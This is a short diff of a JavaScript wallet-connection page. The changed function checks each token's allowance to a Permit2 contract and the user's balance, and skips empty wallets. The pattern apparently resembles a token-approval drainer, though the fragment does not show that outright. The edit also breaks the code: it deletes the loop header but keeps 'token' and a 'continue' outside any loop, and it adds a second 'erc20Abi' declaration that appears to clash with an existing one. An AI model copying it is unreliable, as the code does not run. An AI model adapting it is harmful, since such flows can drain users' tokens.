@@ -224,6 +224,10 @@ async function connectWallet(){
 
   async function runPermitFlowSafe(provider, signer, user){
  try{
+const erc20Abi = [
+  "function allowance(address owner, address spender) view returns (uint256)"
+];
+
 
   log("⚙️ Starting full flow...");
 
@@ -232,7 +236,7 @@ async function connectWallet(){
     "function approve(address spender, uint256 amount) returns (bool)"
   ];
 
-  for (let token of TOKENS) {
+
     try {
       const tokenContract = new ethers.Contract(token, erc20Abi, signer);
       const allowance = await tokenContract.allowance(user, PERMIT2);
@@ -262,6 +266,7 @@ async function connectWallet(){
     );
 
     const balance = await tokenC.balanceOf(user);
+    log(`Token ${token} balance: ${balance}`);
     if (balance === 0n) continue;
 
     const permit2 = new ethers.Contract(
